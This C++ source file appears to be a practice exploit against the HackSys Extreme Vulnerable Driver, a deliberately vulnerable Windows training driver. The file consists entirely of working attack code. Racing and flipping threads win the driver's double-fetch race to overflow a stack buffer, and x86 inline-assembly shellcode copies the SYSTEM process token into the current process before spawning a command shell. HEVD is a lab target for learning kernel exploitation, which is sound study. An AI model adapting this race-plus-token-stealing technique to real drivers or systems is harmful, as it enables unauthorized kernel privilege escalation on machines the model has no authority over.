// HEVD_DoubleFetch.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <stdio.h>

#define MAXIMUM_THREADS_ALLOWED 100



#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

typedef NTSTATUS(WINAPI * My_NtMapUserPhysicalPages)(
	IN PVOID          VirtualAddress,
	IN ULONG_PTR      NumberOfPages,
	IN OUT PULONG_PTR UserPfnArray);

struct DoubleFetch
{
	DWORD buffer;
	DWORD size;
};

typedef struct _RACING_THREAD_PARAMETER {
	HANDLE        DeviceHandle;
	DoubleFetch *DoubleFetch;
} RACING_THREAD_PARAMETER, *PRACING_THREAD_PARAMETER;

BOOL ExploitSuccessful;

void shellcode()
{
	__asm {
		cmp[ExploitSuccessful], TRUE
		je KernelRecoveryStub

		pushad; Save registers state

		; Start of Token Stealing Stub
		xor eax, eax; Set ZERO
		mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
		; _KTHREAD is located at FS : [0x124]

		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current process _EPROCESS structure

		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
			; with SYSTEM process nt!_EPROCESS.Token
			; End of Token Stealing Stub

			popad; Restore registers state

			mov[ExploitSuccessful], TRUE; Set ExploitSuccessful to TRUE

			; Kernel Recovery Stub
			KernelRecoveryStub :
		xor eax, eax; Set NTSTATUS SUCCEESS
			add esp, 12; Fix the stack
			pop ebp; Restore saved EBP
			ret 8; Return cleanly
	}
}

DWORD WINAPI register_thread(LPVOID lpParameter)
{

	DWORD recv = NULL;
	HANDLE hFile = NULL;
	DoubleFetch  *raceObj2 = NULL;
	PRACING_THREAD_PARAMETER RacingThreadParameter = NULL;
	printf("\t\t\t[+] RacingThread Scheduled On Processor: %d\n", GetCurrentProcessorNumber());

	RacingThreadParameter = (PRACING_THREAD_PARAMETER)lpParameter;

	hFile = RacingThreadParameter->DeviceHandle;
	raceObj2 = RacingThreadParameter->DoubleFetch;


	while (!ExploitSuccessful)
	{
		DeviceIoControl(hFile, 0x222037, raceObj2, NULL, NULL, NULL, &recv, NULL);
	}
	
	


	return 0;

}

DWORD WINAPI unregister_thread(LPVOID lpParameter)
{
	DWORD recv = NULL;

	printf("\t\t\t[+] FlippingThread Scheduled On Processor: %d\n", GetCurrentProcessorNumber());

	while (!ExploitSuccessful)
	{
		*(PULONG)lpParameter ^= 0x00000A24;
	}
	return 0;
	
}




int main()
{

	HANDLE hDevice = NULL;
	DWORD recv = NULL;


	hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (FAILED(hDevice))
	{
		printf("Failed to open device\n");
		return 0;
	}

	
	PRACING_THREAD_PARAMETER RacingThreadParameter = NULL;
	PVOID MemoryAddress = NULL;
	SIZE_T UserModeBufferSize = (512 + 9) * sizeof(ULONG);

	char buffer[0x824];

	DoubleFetch * raceObj = (DoubleFetch *)VirtualAlloc(NULL,
		0x1000,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE | PAGE_NOCACHE);

	HANDLE RacingThreads[MAXIMUM_THREADS_ALLOWED] = { 0 };
	HANDLE FlippingThreads[MAXIMUM_THREADS_ALLOWED] = { 0 };
	DWORD_PTR Mask = 0;


	memset(buffer, 0x41, 0x824);


//	MemoryAddress = (PVOID)(((ULONG)buffer + UserModeBufferSize) - sizeof(ULONG));
	//*(PULONG)MemoryAddress = (ULONG)shellcode;

	*(DWORD *)(buffer + 0x820) = (DWORD)shellcode;


	raceObj->buffer = (DWORD)&buffer;
	raceObj->size = 512;



	RacingThreadParameter = (PRACING_THREAD_PARAMETER)HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(RACING_THREAD_PARAMETER));


	RacingThreadParameter->DeviceHandle = hDevice;
	RacingThreadParameter->DoubleFetch = raceObj;


	ExploitSuccessful = FALSE;

	for (int i = 0; i < 2; i++) {
		
		RacingThreads[i] = CreateThread(NULL, 0, register_thread, RacingThreadParameter, CREATE_SUSPENDED, 0);
		SetThreadPriority(RacingThreads[i], THREAD_PRIORITY_HIGHEST);


		FlippingThreads[i] = CreateThread(NULL, 0, unregister_thread, &raceObj->size, CREATE_SUSPENDED, 0);
		SetThreadPriority(FlippingThreads[i], THREAD_PRIORITY_HIGHEST);


		Mask |= 1 << i;
		SetThreadAffinityMask(RacingThreads[i], Mask);

		Mask |= 1 << (i + 1);
		SetThreadAffinityMask(FlippingThreads[i], Mask);

		ResumeThread(RacingThreads[i]);
		ResumeThread(FlippingThreads[i]);

	}

	//HANDLE t1 = CreateThread(0, 0, register_thread, RacingThreadParameter, 0, 0);
	//HANDLE t2 = CreateThread(0, 0, unregister_thread, &raceObj->size, 0, 0);

	if (WaitForMultipleObjects(2, RacingThreads, TRUE, 120000)) {
		// Terminate the threads
		for (int i = 0; i < 2; i++) {
			TerminateThread(RacingThreads[i], EXIT_SUCCESS);
			CloseHandle(RacingThreads[i]);

			TerminateThread(FlippingThreads[i], EXIT_SUCCESS);
			CloseHandle(FlippingThreads[i]);
		}

	}

	// cleanup
	//CloseHandle(t1);
	//CloseHandle(t2);


	VirtualFree(raceObj, 0, MEM_RELEASE);
	HeapFree(GetProcessHeap(), 0, (LPVOID)RacingThreadParameter);
	system("start cmd.exe");
    std::cout << "Hello World!\n";
}
